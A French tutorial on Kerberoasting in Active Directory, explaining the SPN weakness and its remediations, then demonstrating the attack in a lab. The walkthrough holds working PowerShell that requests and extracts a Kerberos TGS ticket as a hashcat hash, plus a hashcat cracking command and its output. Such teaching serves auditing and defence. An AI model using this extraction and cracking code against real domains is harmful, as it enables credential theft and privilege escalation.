---
title: "Le Kerberoasting avec PowerShell"
description: ""
listed: true
---

## Contexte et explication

Après un audit Ping Castle, vous êtes peut-être tombé sur la vulnérabilité "P-Kerberoasting" dans votre domaine (attaque Kerberoasting). Cette faille de sécurité est classée au niveau 1 de criticité (le plus élevé) par l'ANSSI et représente un **gros risque** pour votre Active Directory.

La source de cette vulnérabilité est simple : un compte avec un haut niveau de privilège dans votre annuaire (*Admin du domaine* par exemple) possède une valeur inscrite dans son attribut `servicePrincipalName` (SPN). Cette valeur n'a pas besoin d'être valide ou de pointer vers un vrai serveur/service : sa simple présence suffit pour pouvoir demander un ticket Kerberos.

L'attaque Kerberoasting est la contraction de "Kerberos" (le protocole d'authentification qui fourni le TGS) et de "roast(ing)" qui fait référence au fait de faire chauffer (ou rôtir plus exactement) avec du brute-force le ticket que l'on a réussi à obtenir.

### Fonctionnement du ServicePrincipalName

L'attribut `servicePrincipalName` permet plusieurs choses dans Active Directory :

- **Identification d'un service :** Il permet à Kerberos de savoir quel service un utilisateur veut contacter. Par exemple, `HTTPS/server.contoso.com:443` identifie un serveur web, ou `MSSQLSvc/server.contoso.com` pour une base de données.
- **Authentification sécurisée :** Kerberos utilise le SPN pour générer un ticket d'accès au service demandé (TGS), chiffré avec le mot de passe de l'utilisateur qui porte le `servicePrincipalName`.

### Déroulement d'une attaque

Le principal problème réside dans le fait que **n'importe quel utilisateur du domaine** peut demander un ticket d'accès pour le compte qui porte le SPN (aucun privilège n'est nécessaire). Si on arrive à récupérer au moins un ticket TGS, alors on peut essayer de le *"brute-forcer"* hors-ligne pour obtenir le mot de passe du compte cible.

Puisque le ticket est chiffré de manière irréversible avec le mot de passe, il n'est pas possible de le déchiffrer directement. L'attaquant va plutôt essayer de recréer le même hash de ticket à partir d'un mot de passe qu'il connait (soit en utilisant un dictionnaire, soit en générant aléatoirement un mot de passe). Si le ticket généré par l'attaquant est identique à celui qui a été capturé : le mot de passe a été trouvé.

L'avantage de cette technique est qu'elle est relativement discrète (à moins que vous ailliez des solutions de surveillance comme [Semperis Directory Services Protector](https://www.semperis.com/fr/active-directory-security/) par exemple) et qu'elle permet une escalade directe du Tier 2 vers le Tier 0 (si le mot de passe parvient à être cassé).

### Comment résoudre cette vulnérabilité ?

La seule méthode pour résoudre complètement cette vulnérabilité est de supprimer **toutes** les valeurs présentes dans le SPN.

Bien évidemment, il n'est pas toujours possible de pouvoir faire ce genre d'action. Dans ce cas, voici les actions que vous pouvez mener (sans avoir à supprimer les SPN) :

1. Réduire au maximum les permissions du compte qui porte le SPN pour éviter que sa compromission ne soit un danger immédiat pour votre Active Directory
2. Utiliser des mots de passe très long (plus de 25 caractères) et complexes pour allonger le temps nécessaire pour pouvoir le brute-forcer
3. N'autoriser que le chiffrement AES 256 pour les tickets Kerberos du compte, toujours pour ralentir l'attaque brute-force (attribut `msDS-SupportedEncryptionTypes`)
4. Renouveler le mot de passe régulièrement pour rendre caduque un ticket TGS qui aurait été volé

## Exemple d'attaque

Dans la suite de cet article nous utiliserons des commandes PowerShell du module Active Directory et le logiciel [hashcat](https://hashcat.net/hashcat/). Les deux sont facilement disponibles sous Windows. L'idée de cet article n'est pas de donner un guide détaillé sur cette attaque en environnement réel, mais plutôt de pouvoir la reproduire dans un lab pour démontrer son fonctionnement.

### Création du compte

La première étape est de créer le compte Active Directory avec un SPN est un mot de passe suffisamment faible pour pouvoir être cassé avec une attaque par dictionnaire. Ici nous allons créer le compte de John Smith, avec le mot de passe `ZombieKiller2008` qui devrait satisfaire la politique de mot de passe par défaut (16 caractères de long et de la complexité).

```powershell
$splat = @{
    Name              = 'John Smith'
    Enabled           = $true
    SamAccountName    = 'smithjo'
    UserPrincipalName =  'smithjo@contoso.com'
    AccountPassword   = ('ZombieKiller2008' | ConvertTo-SecureString -AsPlainText -Force)
    OtherAttributes   = @{
        ServicePrincipalName = 'MSSQLSvc/server.contoso.com'
    }
}
New-ADUser @splat
```

### Récupération des informations

On va ensuite collecter des informations liées à l'environnement Active Directory, pour permettre à hashcat de créer un ticket et comparer le résultat avec l'original. Nous avons besoin des informations suivantes :

- Le nom DNS du domaine (contoso.com par exemple)
- Le SamAccountName de l'utilisateur qui porte le SPN (smithjo)
- La valeur du SPN que l'on va utiliser

Voici le code pour récupérer les informations qui nous intéressent :

```powershell
$domain = (Get-ADDomain).DNSRoot
$user = Get-ADUser smithjo -Properties servicePrincipalName
$sam = $user.SamAccountName
$spn = $user.servicePrincipalName[-1]
```

### Récupération du ticket TGS

On peut alors passer à la demande du ticket Kerberos en utilisant le SPN :

```powershell
$ticket = [System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::New($spn)
```

### Récupération et traitement du hash

On va maintenant tenter d'extraire la partie chiffré du ticket. Pour cela, je me suis servi dans le code disponible sur [Invoke-Kerberoast.ps1 · EmpireProject/Empire · GitHub](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1#L660).

```powershell
$ticketByteStream = $ticket.GetRequest()
$TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
$TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)'
$etype = [Convert]::ToByte($Matches.EtypeLen, 16)
$cipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
$cipherText = $Matches.DataToEnd.Substring(0,$cipherTextLen*2)
$hash = "$($cipherText.Substring(0,32))`$$($cipherText.Substring(32))"
```

Conversion du hash vers le format hashcat :

```powershell
$hashcatFormat = '$krb5tgs$' + $etype + '$*' + $sam + '$' + $domain + '$' + $spn + '*$' + $hash
$hashcatFormat | Set-Clipboard
```

Le hash obtenu ressemble alors à celui-ci :

```plainprésentement
$krb5tgs$23$*smithjo$contoso.com$MSSQLSvc/server.contoso.com*$abf9befd[...]f3ea6085
```

On y retrouve les informations suivantes :

Information | Explication
----------- | -----------
`krb5tgs` | Hash Kerberos TGS
`23` | Chiffrement utilisé : RC4-HMAC
`smithjo` | Le SamAccountName du compte cible (celui qui porte le SPN)
`contoso.com` | Le nom DNS du domaine Active Directory
`MSSQLSvc/server.contoso.com` | Le ServicePrincipalName qui a été utilisé
`abf9befd[...]f3ea6085` | Le hash du ticket, chiffré avec le mot de passe du compte `smithjo`

### Roasting du hash

On peut maintenant essayer de casser le hash avec [hashcat](https://hashcat.net/hashcat/).

Pour plus d'accessibilité, on va mener une attaque par dictionnaire (qui est beaucoup moins coûteuse en ressources qu'une attaque par force brute). Le dictionnaire que j'utilise est [edermi Kerberoast PW list (XZ format) · GitHub](https://gist.github.com/The-Viper-One/a1ee60d8b3607807cc387d794e809f0b).

```plaintext
.\hashcat.exe -a 0 .\hash.txt .\kerberoast_pws.txt
```

La commande ci-dessus utilise deux fichiers externes :

- "hash.txt" qui contient le hash récupéré et mis en forme pour hashcat
- "kerberoast_pws.txt" qui contient le dictionnaire téléchargé sur GitHub

Et au bout de quelques dizaines de secondes de traitement, on obtient le mot de passe en clair : `ZombieKiller2008`

```plaintext
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #1: Intel(R) Iris(R) Xe Graphics, 3552/7176 MB (1794 MB allocatable), 96MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 210 MB

Dictionary cache hit:
* Filename..: .\kerberoast_pws.txt
* Passwords.: 35638385
* Bytes.....: 404901152
* Keyspace..: 35638385

$krb5tgs$23$*smithjo$contoso.com$MSSQLSvc/server.contoso.com*$abf9befd[...]f3ea6085:ZombieKiller2008

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*smithjo$contoso.com$MSSQLSvc/server.s...ea6085
Time.Started.....: Wed Jun 25 11:04:25 2025 (47 secs)
Time.Estimated...: Wed Jun 25 11:05:12 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\kerberoast_pws.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   765.6 kH/s (7.39ms) @ Accel:16 Loops:1 Thr:8 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 35561472/35638385 (99.78%)
Rejected.........: 0/35561472 (0.00%)
Restore.Point....: 35549184/35638385 (99.75%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: (zoeyis3) -> Zoogbroeders?

Started: Wed Jun 25 11:04:25 2025
Stopped: Wed Jun 25 11:05:13 2025
```
